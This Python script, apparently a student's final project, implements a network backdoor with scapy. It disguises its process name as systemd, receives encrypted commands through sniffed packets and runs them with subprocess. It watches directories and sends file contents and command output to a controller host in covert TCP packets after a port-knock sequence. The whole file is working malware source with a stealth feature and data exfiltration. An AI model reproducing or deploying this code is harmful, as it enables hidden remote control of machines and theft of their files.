#   Backdoor - Final Project
#
#   Details -
#   [details of program here]
#
#   Usage   -
#   python backdoor.py
#   nohup python backdoor.py &
#
#   Kill Process
#   ps -a
#   ps -aux
#   kill [pid]
#
#   Author  Date        Description
#   GSM     NOV-16      File Creation
#   GSM     NOV-18      Watch File and Downlaod File
#   GSM/AM  DEC-06      Rest
#

#   Imports
from scapy.all  import *
import inotify.adapters
import time
import procname
import os
from utils import *

#   Constants
parser = 1          #   Number of Characters to send at once

#   Variables
knock_accepted = False

# Send 3 packets in a row less than 5 seconds apart to ports 6000, 7000, and 8000
def Knocker():
    print ( "[+] Knocker" )

    time.sleep ( 2 )

    if protocol == "tcp":
        first_knock = IP ( src = source, dst = dest ) / TCP ( dport = 6000 )
    send ( first_knock )
    print ( "Knock 1" )

    time.sleep ( 2 )

    if protocol == "tcp":
        second_knock = IP ( src = source, dst = dest ) / TCP ( dport = 7000 )
    send ( second_knock )
    print ( "Knock 2" )

    time.sleep ( 2 )

    if protocol == "tcp":
        third_knock = IP ( src = source, dst = dest ) / TCP ( dport = 8000 )
    send ( third_knock )
    print ( "Knock 3" )

    # Listen from attacker that the knock has been accepted
    capture = sniff ( filter = "host " + source + " and port " + port, count = 1 )
    data    = decrypt ( capture[0].payload.load )
    if data == "knock is accepted":
        print ( "Knock Accepted" )
        knock_accepted = True
        return knock_accepted

#   Packt Sending Function
def SendResponsePacket ( data ):

    #   Variables
    count = 0
    parts = 0
    line  = ""
    tosend = []
    covert_payload = ""

    #   Parse Characters
    for character in data:
        count += 1
        line = line + character
        if count % parser == 0:
            tosend.append ( line )
            line = ""
            parts += 1

    print ( "Packets to Send: ", int ( parts ) )

    #   Send Packet Counter
    time.sleep ( timeout )
    if protocol == "tcp":
        time.sleep ( timeout )
        parts = str(parts)
        encrypted_parts = encrypt(parts)
        encoded_parts = bytearray(encrypted_parts)
        print("Encoded Parts: ", encoded_parts)
        print("Encrypted Parts: ", encrypted_parts)
        print("Len of Encrypted Parts: ", len(encrypted_parts))
        print("Type of EParts: ", type(encoded_parts))

        packet = IP ( src = source, dst = dest  ) / TCP ( sport = int ( port ), dport = int ( port ) ) / encrypted_parts

    send ( packet )

    time.sleep ( timeout )

    #   Send Data
    for part in tosend:
        print ( "Sending: ", str ( part ) )

        # Send packet with covert payload hidden in the TCP IP header window
        if protocol == "tcp":
            time.sleep ( timeout )
            encoded_part = part.encode()
            encrypted_part = encrypt(part)
            packet = IP ( src = source, dst = dest ) / TCP ( sport = int ( port ), dport = int ( port ) ) / encrypted_part

        send ( packet )

#   Download File
def DownloadFile ( directory, file ):
    #   Check File Exists
    if ( not os.path.isfile ( directory + "/" + file ) ):
        SendFile ( False )
    else:
        SendFile ( True )

#   Watch File Creation
def WatchFile ( directory ):
    #   Variables
    data = ""
    
    #   Start Watch in Directory for a file
    watcher = inotify.adapters.Inotify ( )
    watcher.add_watch ( directory )

    print ( "[+] Starting File Watch" )

    s = time.time ( ) + 30

    for event in watcher.event_gen ( yield_nones = False ):

        if time.time ( ) > s:
            break

        if len ( event ) != 0:
            ( _, type_names, path, file ) = event
            time.sleep ( timeout )
            data = path + " Event: " + type_names[0] + " | For File: " + file
            encrypted_parts = encrypt ( str ( data ) )
            packet = IP ( src = source, dst = dest  ) / TCP ( sport = int ( port ), dport = int ( port ) ) / encrypted_parts
            send ( packet )

def SendFile ( success ):

    path = directory + "/" + file

    if ( success ):
        #   Send File
        with open ( path, "r" ) as sendfile:
            data = sendfile.read ( )

        SendResponsePacket ( data )

    else:
        #   Wait For Attacker Listener
        time.sleep ( timeout )

        #   Send Failure Response
        if protocol == "tcp":
            packet = IP ( src = source, dst = dest ) / TCP ( sport = int ( port ), dport = int ( port ) ) / encrypt ( "filenotfound" )
        print ( "\t [-] File not Found" )
        send ( packet )

def RunCommand ( command ):
    print ( "[+] Run Command" )

    #   Wait For Attacker Listener
    time.sleep ( timeout )

    #   Run Linux Commands
    output = subprocess.Popen ( command, stdout = subprocess.PIPE, stderr = subprocess.STDOUT )
    stdout, stderr = output.communicate ( )

    print ( "Command data: ", stdout )

    SendResponsePacket ( stdout )

#   Main
print ( "[+] Starting Backdoor" )

#   Disguise Process
procname.setprocname ( "/lib/systemd/systemd --user" )

#   Read Configuration File
with open ( "config.txt", "r" ) as sendfile:
    config = sendfile.readlines ( )

count = 1
for line in config:
    if ( count == 1 ):
        dest = line.rstrip ( )
    elif ( count == 2 ):
        source = line.rstrip ( )
    elif ( count == 3 ):
        port = line.rstrip ( )
    elif ( count == 4 ):
        protocol = line.rstrip ( )
    elif ( count == 5 ):
        timeout = float ( line.rstrip ( ) )

    count += 1

while True:

    print ( "[+] Backdoor Activated" )


    #   Listen For Packet
    capture = sniff ( filter = "host " + source + " and port " + port, count = 1 )
    data    = decrypt ( capture[0].payload.load )

    #   Split Mode and File
    arguments = data.split ( )
    mode      = arguments[0]
    command   = ""

    print ( "[+] Request Received: " + str( mode ) )

    if mode == "watch":
        directory = arguments[1]
        Knocker()
        WatchFile ( directory )
    elif mode == "download":
        directory = arguments[1]
        file      = arguments[2]
        Knocker()
        DownloadFile ( directory, file )
    elif mode == "execute":
        del arguments[0]
        Knocker()
        RunCommand ( arguments )
